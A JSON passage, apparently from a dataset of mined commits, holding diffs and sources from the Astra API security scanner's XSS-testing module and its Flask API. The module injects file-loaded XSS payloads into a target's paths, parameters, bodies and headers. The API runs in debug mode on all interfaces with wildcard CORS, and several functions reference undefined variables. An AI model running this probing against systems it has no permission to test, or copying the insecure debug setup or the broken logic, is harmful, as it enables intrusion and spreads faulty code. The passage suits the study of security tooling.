                                "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}",
                                "                return"
                            ],
                            "goodparts": [
                                "            if result is not True:",
                                "                if xss_request_url.text.find(payload) != -1:",
                                "                    impact = check_xss_impact(xss_request_url.headers)",
                                "                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}",
                                "                    dbupdate.insert_record(attack_result)",
                                "                    result = True",
                                "                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}"
                            ]
                        },
                        {
                            "diff": "\n                     # check for URI based XSS\n                     # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                     if result is not True:\n-                        print \"param to test\",key\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        print xss_request.text\n                         if xss_request.text.find(payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n",
                            "add": 0,
                            "remove": 2,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "                        print \"param to test\",key",
                                "                        print xss_request.text"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n             except:\n                 logs.logging.info(\"XSS: No GET param found!\")\n \n-        print \"all params\",vul_param\n+        if vul_param:\n+            # Update all vulnerable params to db.\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n",
                            "add": 3,
                            "remove": 1,
                            "filename": "/modules/xss.py",
                            "badparts": [
                                "        print \"all params\",vul_param"
                            ],
                            "goodparts": [
                                "        if vul_param:",
                                "            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})"
                            ]
                        }
                    ],
                    "source": "\nimport os import urlparse import sendrequest as req import utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url=req.api_request(parsed_url+'/'+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging.info(\"GET param for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) ",
                    "sourceWithComments": "import os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    if res_headers['Content-Type']:\n        if 'application/json' or 'text/plain' in xss_request['Content-Type']:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    xss_result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                xss_result = True\n\n            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n            if xss_request_url.text.find(payload) != -1:\n                impact = check_xss_impact()\n                xss_result = True\n\n            if xss_result is True:\n                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                dbupdate.insert_record(attack_result)\n                return\n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # Test for XSS in GET param\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        print \"param to test\",key\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        print xss_request.text\n                        if xss_request.text.find(payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        print \"all params\",vul_param\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n        #xss_http_headers(url,method,headers,body,scanid)"
                }
            },
            "msg": "changes in xss_http_headers function"
        },
        "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/ee32dd65ddddc6dfefcf012def42eb1a3ae23e66",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/ee32dd65ddddc6dfefcf012def42eb1a3ae23e66",
            "sha": "ee32dd65ddddc6dfefcf012def42eb1a3ae23e66",
            "keyword": "XSS change",
            "diff": "diff --git a/API/api.py b/API/api.py\nindex 98971ec..1717926 100644\n--- a/API/api.py\n+++ b/API/api.py\n@@ -10,7 +10,7 @@\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts\ndiff --git a/README.md b/README.md\nindex 1d33676..c243846 100644\n--- a/README.md\n+++ b/README.md\n@@ -81,8 +81,15 @@ optional arguments:\n \n ![alt text](https://raw.githubusercontent.com/flipkart-incubator/apiscan/7539de1beefb7941d4224bf9b15c584592a0cd81/utils/report.png)\n \n-## Lead Developers\n+## Lead Developer\n - Sagar Popat (@popat_sagar) \n \n-## Project Contributors\n+## Credits\n - Harsh Grover\n+- Prajal Kulkarani\n+- Ankur Bhargava\n+- Mohan Kallepalli\n+- Pardeep battu\n+- Anirudh Anand\n+- Divya Salu John\n+\ndiff --git a/astra.py b/astra.py\nindex b8dc545..5d05cf2 100644\n--- a/astra.py\n+++ b/astra.py\n@@ -240,6 +240,9 @@ def main():\n     else:\n         login_require = True\n \n+    if body:\n+        body = ast.literal_eval(body)\n+\n     # Configuring ZAP before starting a scan\n     get_auth = get_value('config.property','login','auth_type')\n \ndiff --git a/modules/xss.py b/modules/xss.py\nindex 93dafcb..6b3c332 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -4,6 +4,7 @@\n import utils.logs as logs\n import urlparse\n import time\n+import urllib\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,8 +30,9 @@ def fetch_xss_payload():\n \n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n+    print \"response header\",res_headers['Content-Type']\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n+        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -41,6 +43,42 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_payload_decode(payload):\n+    # Return decoded payload of XSS. \n+    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n+    return decoded_payload\n+\n+def xss_post_method(url,method,headers,body,scanid=None):\n+    # This function checks XSS through POST method.\n+    print url, headers,method,body\n+    temp_body = {}\n+    post_vul_param = ''\n+    for key,value in body.items():\n+        xss_payloads = fetch_xss_payload()\n+        for payload in xss_payloads:\n+            temp_body.update(body)\n+            temp_body[key] = payload\n+            print \"updated body\",temp_body\n+            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_post_request.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_post.body)\n+                if db_update is not True:\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                    dbupdate.insert_record(attack_result)\n+                    db_update = True\n+                    vul_param += key\n+                else:\n+                    result = True\n+                    if vul_param == '':\n+                        post_vul_param += key\n+                    else:\n+                        post_vul_param += ','+key \n+\n+    if post_vul_param:\n+        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n+\n+\n def xss_http_headers(url,method,headers,body,scanid=None):\n     # This function checks different header based XSS.\n     # XSS via Host header (Limited to IE)\n@@ -53,11 +91,12 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         host_header = {\"Host\" : parse_domain + '/' + payload}\n         headers.update(host_header)\n         host_header_xss = req.api_request(url, \"GET\", headers)\n-        if host_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if host_header_xss.text.find(decoded_payload) != -1:\n             impact = \"Low\"\n-            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": xss_request.text}\n             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n-            dbupdate.insert_record(xss_http_headers)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n+            dbupdate.insert_record(attack_result)\n             break\n \n     # Test for Referer based XSS \n@@ -66,12 +105,14 @@ def xss_http_headers(url,method,headers,body,scanid=None):\n         referer_header = {\"Referer\" : referer_header_value}\n         temp_headers.update(referer_header)\n         ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n-        if ref_header_xss.text.find(payload) != -1:\n+        decoded_payload = xss_payload_decode(payload)\n+        if ref_header_xss.text.find(decoded_payload) != -1:\n+            print ref_header_xss.text\n             impact = check_xss_impact(temp_headers)\n             print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n             attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n             dbupdate.insert_record(attack_result)\n-            break\n+            return\n \n \n def xss_get_url(url,method,headers,body,scanid=None):\n@@ -90,20 +131,21 @@ def xss_get_url(url,method,headers,body,scanid=None):\n         parsed_url = url\n \n     for payload in xss_payloads:\n-            xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n-            if result is not True:\n-                if xss_request_url.text.find(payload) != -1:\n-                    impact = check_xss_impact(xss_request_url.headers)\n-                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n-                    dbupdate.insert_record(attack_result)\n-                    result = True\n-\n-            xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n-            if xss_request_url.text.find(payload) != -1:\n-                impact = check_xss_impact()\n-                print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n+        if result is not True:\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_request_url.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_request_url.headers)\n                 attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                 dbupdate.insert_record(attack_result)\n+                result = True\n+\n+        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n+        if xss_request_url.text.find(decoded_payload) != -1:\n+            impact = check_xss_impact(xss_request_uri.headers)\n+            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n+            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n+            dbupdate.insert_record(attack_result)\n                 \n \n def xss_get_uri(url,method,headers,body,scanid=None):\n@@ -126,7 +168,10 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n                         parsed_url = urlparse.urlparse(url)\n                         xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                         xss_request = req.api_request(xss_url,\"GET\",headers)\n-                        if xss_request.text.find(payload) != -1:\n+                        decoded_payload = xss_payload_decode(payload)\n+                        print decoded_payload\n+                        print xss_url\n+                        if xss_request.text.find(decoded_payload) != -1:\n                             impact = check_xss_impact(xss_request.headers)\n                             logs.logging.info(\"%s is vulnerable to XSS\",url)\n                             print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n@@ -147,7 +192,8 @@ def xss_get_uri(url,method,headers,body,scanid=None):\n \n         if vul_param:\n             # Update all vulnerable params to db.\n-            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" are vulnerable to XSS\"}})\n+            print vul_param,scanid\n+            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n \n \n def xss_check(url,method,headers,body,scanid):\n@@ -155,5 +201,8 @@ def xss_check(url,method,headers,body,scanid):\n     if method == 'GET' or method == 'DEL':\n         xss_get_uri(url,method,headers,body,scanid)\n         xss_get_url(url,method,headers,body,scanid)\n-    \n+\n+    if method == 'POST' or method == 'PUT':\n+        xss_post_method(url,method,headers,body,scanid)\n+\n     xss_http_headers(url,method,headers,body,scanid)\n\\ No newline at end of file\n",
            "message": "",
            "files": {
                "/API/api.py": {
                    "changes": [
                        {
                            "diff": "\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts",
                            "add": 1,
                            "remove": 1,
                            "filename": "/API/api.py",
                            "badparts": [
                                "from apiscan import scan_single_api"
                            ],
                            "goodparts": [
                                "from astra import scan_single_api"
                            ]
                        }
                    ],
                    "source": "\nimport ast import json import sys import hashlib import time sys.path.append('../') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid) if scan_status is True: msg={\"status\": scanid} try: db.scanids.insert({\"scanid\": scanid, \"name\": name, \"url\": url}) except: print \"Failed to update DB\" else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records: for data in records: data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts(scanid): print \"ScanID is \",scanid result=fetch_records(scanid) resp=jsonify(result) resp.headers[\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0', port=8094,debug=True) ",
                    "sourceWithComments": "import ast\nimport json\nimport sys\nimport hashlib\nimport time\n\nsys.path.append('../')\n\nfrom flask import Flask,render_template\nfrom flask import Response,make_response\nfrom flask import request\nfrom flask import Flask\nfrom apiscan import scan_single_api\nfrom flask import jsonify\nfrom pymongo import MongoClient\nfrom utils.vulnerabilities import alerts\n \napp = Flask(__name__,template_folder='../Dashboard/templates',static_folder='../Dashboard/static')\n \n# Mongo DB connection \nclient = MongoClient('localhost',27017)\nglobal db\ndb = client.apiscan\n\n\n############################# Start scan API ######################################\ndef generate_hash():\n    # Return md5 hash value of current timestmap \n    scanid = hashlib.md5(str(time.time())).hexdigest()\n    return scanid\n\n# Start the scan and returns the message\n@app.route('/scan/', methods = ['POST'])\ndef start_scan():\n    scanid = generate_hash()\n    content = request.get_json()\n    try:\n        name = content['appname']\n        url = content['url']\n        headers = content['headers']\n        body = content['body']\n        method = content['method']\n        api = \"Y\"\n        scan_status = scan_single_api(url, method, headers, body, api, scanid)\n        if scan_status is True:\n            # Success\n            msg = {\"status\" : scanid}\n            try:\n                db.scanids.insert({\"scanid\" : scanid, \"name\" : name, \"url\" : url})\n            except:\n                print \"Failed to update DB\"\n        else:\n            msg = {\"status\" : \"Failed\"}\n    \n    except:\n        msg = {\"status\" : \"Failed\"} \n    \n    return jsonify(msg)\n\n\n#############################  Fetch ScanID API #########################################\n@app.route('/scan/scanids/', methods=['GET'])\ndef fetch_scanids():\n    scanids = []\n    records = db.scanids.find({})\n    if records:\n        for data in records:\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n                if data['scanid']:\n                    if data['scanid'] not in scanids:\n                        scanids.append({\"scanid\" : data['scanid'], \"name\" : data['name'], \"url\" : data['url']}) \n            except:\n                pass\n\n        return jsonify(scanids)\n############################# Alerts API ##########################################\n\n# Returns vulnerbilities identified by tool \ndef fetch_records(scanid):\n    # Return alerts identified by the tool\n    vul_list = []\n    records = db.vulnerabilities.find({\"scanid\":scanid})\n    print \"Records are \",records\n    if records:\n        for data in records:  \n            print \"Data is\",data\n            if data['req_body'] == None:\n                data['req_body'] = \"NA\" \n\n            data.pop('_id')\n            try:\n                data =  ast.literal_eval(json.dumps(data))\n            except:\n                print \"Falied to parse\"\n\n            print \"Data\",data\n            try:\n                if data['id'] == \"NA\":\n                    all_data = {'url' : data['url'], 'impact' : data['impact'], 'name' : data['name'], 'req_headers' : data['req_headers'], 'req_body' : data['req_body'], 'res_headers' : data['res_headers'], 'res_body' : data['res_body'], 'Description' : data['Description'], 'remediation' : data['remediation']}\n                    vul_list.append(all_data)\n\n                if data['id']:\n                    for vul in alerts:\n                        if data['id'] == vul['id']:\n                            all_data = {\n                                        'url' : data['url'],\n                                        'impact' : data['impact'],\n                                        'name' : data['alert'],\n                                        'req_headers' : data['req_headers'],\n                                        'req_body' : data['req_body'],\n                                        'res_headers' : data['res_headers'],\n                                        'res_body' : data['res_body'],\n                                        'Description' : vul['Description'],\n                                        'remediation' : vul['remediation']\n                                        }\n                            vul_list.append(all_data)\n                            break\n\n            except:\n                pass\n\n        print vul_list\n        return vul_list\n        \n\n@app.route('/alerts/<scanid>', methods=['GET'])\ndef return_alerts(scanid):\n    print \"ScanID is \",scanid\n    result = fetch_records(scanid)\n    resp = jsonify(result)\n    resp.headers[\"Access-Control-Allow-Origin\"] = \"*\"\n    return resp\n\n#############################Dashboard#########################################\n\n@app.route('/', defaults={'page': 'scan.html'})\n@app.route('/<page>')\ndef view_dashboard(page):\n    return render_template('{}'.format(page))\n\napp.run(host='0.0.0.0', port= 8094,debug=True)\n"
                }
            },
            "msg": "XSS module changes"
        },
        "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8": {
            "url": "https://api.github.com/repos/flipkart-incubator/Astra/commits/7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8",
            "html_url": "https://github.com/flipkart-incubator/Astra/commit/7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8",
            "sha": "7b48dd5bd83353133ecbcc541b9fdc73cb0ce9a8",
            "keyword": "XSS change",
            "diff": "diff --git a/API/api.py b/API/api.py\nindex 98971ec..1717926 100644\n--- a/API/api.py\n+++ b/API/api.py\n@@ -10,7 +10,7 @@\n from flask import Response,make_response\n from flask import request\n from flask import Flask\n-from apiscan import scan_single_api\n+from astra import scan_single_api\n from flask import jsonify\n from pymongo import MongoClient\n from utils.vulnerabilities import alerts\ndiff --git a/README.md b/README.md\nindex 1d33676..c243846 100644\n--- a/README.md\n+++ b/README.md\n@@ -81,8 +81,15 @@ optional arguments:\n \n ![alt text](https://raw.githubusercontent.com/flipkart-incubator/apiscan/7539de1beefb7941d4224bf9b15c584592a0cd81/utils/report.png)\n \n-## Lead Developers\n+## Lead Developer\n - Sagar Popat (@popat_sagar) \n \n-## Project Contributors\n+## Credits\n - Harsh Grover\n+- Prajal Kulkarani\n+- Ankur Bhargava\n+- Mohan Kallepalli\n+- Pardeep battu\n+- Anirudh Anand\n+- Divya Salu John\n+\ndiff --git a/astra.py b/astra.py\nindex b8dc545..5d05cf2 100644\n--- a/astra.py\n+++ b/astra.py\n@@ -240,6 +240,9 @@ def main():\n     else:\n         login_require = True\n \n+    if body:\n+        body = ast.literal_eval(body)\n+\n     # Configuring ZAP before starting a scan\n     get_auth = get_value('config.property','login','auth_type')\n \ndiff --git a/modules/xss.py b/modules/xss.py\nindex 93dafcb..6b3c332 100644\n--- a/modules/xss.py\n+++ b/modules/xss.py\n@@ -4,6 +4,7 @@\n import utils.logs as logs\n import urlparse\n import time\n+import urllib\n \n from utils.logger import logger\n from utils.db import Database_update\n@@ -29,8 +30,9 @@ def fetch_xss_payload():\n \n def check_xss_impact(res_headers):\n     # Return the impact of XSS based on content-type header\n+    print \"response header\",res_headers['Content-Type']\n     if res_headers['Content-Type']:\n-        if 'application/json' or 'text/plain' in res_headers['Content-Type']:\n+        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n             # Possible XSS \n             impact = \"Low\"\n         else:\n@@ -41,6 +43,42 @@ def check_xss_impact(res_headers):\n     return impact\n \n \n+def xss_payload_decode(payload):\n+    # Return decoded payload of XSS. \n+    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n+    return decoded_payload\n+\n+def xss_post_method(url,method,headers,body,scanid=None):\n+    # This function checks XSS through POST method.\n+    print url, headers,method,body\n+    temp_body = {}\n+    post_vul_param = ''\n+    for key,value in body.items():\n+        xss_payloads = fetch_xss_payload()\n+        for payload in xss_payloads:\n+            temp_body.update(body)\n+            temp_body[key] = payload\n+            print \"updated body\",temp_body\n+            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n+            decoded_payload = xss_payload_decode(payload)\n+            if xss_post_request.text.find(decoded_payload) != -1:\n+                impact = check_xss_impact(xss_post.body)\n+                if db_update is not True:\n+                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n+                    dbupdate.insert_record(attack_result)\n+                    db_update = True\n+                    vul_param += key\n+                else:\n+                    result = True\n+                    if vul_param == '':\n+                        post_vul_param += key\n+                    else:\n+                        post_vul_param += ','+key \n+\n+    if post_vul_param:\n+        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n+\n+\n def xss_http_headers(url,method,headers,body,scanid=None):\n     # This function checks different header based XSS.\n     # XSS via Host header (Limited to 